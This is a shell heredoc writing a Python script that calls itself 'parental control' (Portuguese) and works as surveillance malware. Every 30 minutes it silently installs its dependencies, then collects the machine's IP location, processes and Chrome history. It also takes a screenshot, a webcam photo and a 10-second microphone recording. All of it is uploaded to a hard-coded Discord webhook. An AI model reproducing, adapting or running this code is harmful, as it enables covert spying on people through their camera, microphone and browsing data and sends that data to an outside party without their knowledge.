cat > controle.py << 'CODIGO'
#!/usr/bin/env python3
import subprocess,sys,os,time,json,platform,shutil,sqlite3
from datetime import datetime
from pathlib import Path
from urllib.request import Request,urlopen

print("[*] A instalar dependencias...")
for p in["psutil","pillow","opencv-python","sounddevice","scipy","numpy"]:
    try:
        subprocess.check_call([sys.executable,"-m","pip","install","-q",p],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
    except:
        pass

import psutil
try:
    from PIL import ImageGrab
    TEM_PIL=True
except:
    TEM_PIL=False
try:
    import cv2
    TEM_CV2=True
except:
    TEM_CV2=False
try:
    import sounddevice as sd
    import scipy.io.wavfile as wavfile
    TEM_AUDIO=True
except:
    TEM_AUDIO=False

SISTEMA=platform.system()
HOME=str(Path.home())
REPORT_DIR=os.path.join(HOME,"controle_parental","relatorios")
AUDIO_DIR=os.path.join(HOME,"controle_parental","audios")
WEBHOOK="https://discord.com/api/webhooks/1459232383445500128/UysW7g1xigRBIHf1nSv7sjyZL-U6mCW5PGSSNyG-Us5HW4KDhOw1JZLT7O_V-W97fzxS"

os.makedirs(REPORT_DIR,exist_ok=True)
os.makedirs(AUDIO_DIR,exist_ok=True)

def ts():
    return datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

def enviar_texto(titulo,desc):
    try:
        dados=json.dumps({"embeds":[{"title":titulo,"description":desc[:4000],"color":3447003}]}).encode()
        req=Request(WEBHOOK,data=dados)
        req.add_header("Content-Type","application/json")
        req.add_header("User-Agent","Mozilla/5.0")
        urlopen(req,timeout=30)
        print("[+] Discord: mensagem enviada")
    except Exception as e:
        print(f"[-] Discord erro: {e}")

def enviar_arquivo(arq,msg=""):
    try:
        if not os.path.exists(arq):
            return
        boundary=f"---B{int(time.time())}"
        with open(arq,"rb") as f:
            conteudo=f.read()
        nome=os.path.basename(arq)
        body=b""
        if msg:
            body+=f"--{boundary}\r\n".encode()
            body+=b"Content-Disposition: form-data; name=\"content\"\r\n\r\n"
            body+=msg.encode()+b"\r\n"
        body+=f"--{boundary}\r\n".encode()
        body+=f"Content-Disposition: form-data; name=\"file\"; filename=\"{nome}\"\r\n".encode()
        body+=b"Content-Type: application/octet-stream\r\n\r\n"
        body+=conteudo+b"\r\n"
        body+=f"--{boundary}--\r\n".encode()
        req=Request(WEBHOOK,data=body)
        req.add_header("Content-Type",f"multipart/form-data; boundary={boundary}")
        req.add_header("User-Agent","Mozilla/5.0")
        urlopen(req,timeout=120)
        print(f"[+] Enviado: {nome}")
    except Exception as e:
        print(f"[-] Erro: {e}")

def salvar_txt(nome,dados):
    try:
        arq=os.path.join(REPORT_DIR,f"{nome}_{ts()}.txt")
        with open(arq,"w",encoding="utf-8") as f:
            f.write(f"=== {nome.upper()} ===\n\n")
            for k,v in dados.items():
                f.write(f">> {k}\n")
                if isinstance(v,list):
                    for i,item in enumerate(v,1):
                        f.write(f"  {i}. {item}\n")
                else:
                    f.write(f"  {v}\n")
                f.write("\n")
        return arq
    except:
        return None

def obter_localizacao():
    try:
        req=Request("http://ip-api.com/json/")
        req.add_header("User-Agent","Mozilla/5.0")
        r=urlopen(req,timeout=10)
        d=json.loads(r.read().decode())
        return{"ip":d.get("query","?"),"cidade":d.get("city","?"),"pais":d.get("country","?"),"isp":d.get("isp","?")}
    except:
        return{"ip":"?","cidade":"?","pais":"?","isp":"?"}

def obter_sistema():
    try:
        mem=psutil.virtual_memory()
        disco=psutil.disk_usage("/")
        bat=psutil.sensors_battery()
        return{"so":f"{SISTEMA} {platform.release()}","user":os.environ.get("USER",os.environ.get("USERNAME","?")),"cpu":f"{psutil.cpu_percent()}%","ram":f"{mem.percent}%","disco":f"{disco.percent}%","bat":f"{bat.percent}%" if bat else "N/A"}
    except:
        return{}

def listar_processos():
    try:
        procs=[]
        for p in psutil.process_iter(["pid","name","memory_percent"]):
            try:
                info=p.info
                if info["memory_percent"] and info["memory_percent"]>0.1:
                    procs.append(f"{info['name']} - {info['memory_percent']:.1f}%")
            except:
                pass
        return procs[:30]
    except:
        return[]

def obter_historico():
    try:
        hist=[]
        if SISTEMA=="Windows":
            path=os.path.join(HOME,"AppData","Local","Google","Chrome","User Data","Default","History")
        else:
            path=os.path.join(HOME,".config","google-chrome","Default","History")
        if os.path.exists(path):
            temp=os.path.join(REPORT_DIR,"temp.db")
            shutil.copy2(path,temp)
            conn=sqlite3.connect(temp)
            cur=conn.cursor()
            cur.execute("SELECT url,title FROM urls ORDER BY last_visit_time DESC LIMIT 50")
            for url,titulo in cur.fetchall():
                hist.append(f"{(titulo or'?')[:30]} - {url[:50]}")
            conn.close()
            os.remove(temp)
        return hist
    except:
        return[]

def capturar_tela():
    if SISTEMA=="Windows" and TEM_PIL:
        try:
            arq=os.path.join(REPORT_DIR,f"tela_{ts()}.png")
            ImageGrab.grab().save(arq)
            print("[+] Screenshot OK")
            return arq
        except:
            pass
    else:
        try:
            arq=os.path.join(REPORT_DIR,f"tela_{ts()}.png")
            os.system(f"scrot {arq} 2>/dev/null || gnome-screenshot -f {arq} 2>/dev/null")
            if os.path.exists(arq):
                print("[+] Screenshot OK")
                return arq
        except:
            pass
    print("[-] Screenshot falhou")
    return None

def capturar_camera():
    if not TEM_CV2:
        print("[-] Camera: sem OpenCV")
        return None
    try:
        arq=os.path.join(REPORT_DIR,f"camera_{ts()}.jpg")
        cap=cv2.VideoCapture(0)
        if not cap.isOpened():
            print("[-] Camera nao encontrada")
            return None
        time.sleep(2)
        ret,frame=cap.read()
        cap.release()
        if ret:
            cv2.imwrite(arq,frame)
            print("[+] Camera OK")
            return arq
        return None
    except:
        return None

def capturar_audio(seg=10):
    if not TEM_AUDIO:
        print("[-] Audio: sem dependencias")
        return None
    try:
        arq=os.path.join(AUDIO_DIR,f"audio_{ts()}.wav")
        print(f"[*] Gravando {seg}s...")
        audio=sd.rec(int(seg*44100),samplerate=44100,channels=1,dtype="int16")
        sd.wait()
        wavfile.write(arq,44100,audio)
        print("[+] Audio OK")
        return arq
    except:
        return None

def executar():
    print("\n"+"="*50)
    print(f"  MONITORAMENTO - {ts()}")
    print("="*50+"\n")
    loc=obter_localizacao()
    sis=obter_sistema()
    procs=listar_processos()
    hist=obter_historico()
    tela=capturar_tela()
    camera=capturar_camera()
    audio=capturar_audio(10)
    arquivos=[]
    if procs:
        a=salvar_txt("processos",{"ativos":procs})
        if a:arquivos.append(a)
    if hist:
        a=salvar_txt("historico",{"sites":hist})
        if a:arquivos.append(a)
    msg=f"""**Localizacao**
IP: {loc.get('ip','?')} | {loc.get('cidade','?')}, {loc.get('pais','?')}

**Sistema**
{sis.get('so','?')} | User: {sis.get('user','?')}
CPU: {sis.get('cpu','?')} | RAM: {sis.get('ram','?')} | Bat: {sis.get('bat','?')}

**Dados**
Processos: {len(procs)} | Historico: {len(hist)}"""
    enviar_texto(f"Monitoramento {datetime.now().strftime('%d/%m %H:%M')}",msg)
    time.sleep(1)
    if camera:
        enviar_arquivo(camera,"CAMERA")
        time.sleep(1)
    if tela:
        enviar_arquivo(tela,"SCREENSHOT")
        time.sleep(1)
    if audio:
        enviar_arquivo(audio,"AUDIO")
        time.sleep(1)
    for a in arquivos:
        enviar_arquivo(a)
        time.sleep(0.5)
    print("\n[OK] Concluido!\n")

if __name__=="__main__":
    print("\n=== CONTROLE PARENTAL ===\n")
    executar()
    print("[*] Proximo em 30 min... (Ctrl+C sair)")
    while True:
        time.sleep(1800)
        executar()
CODIGO
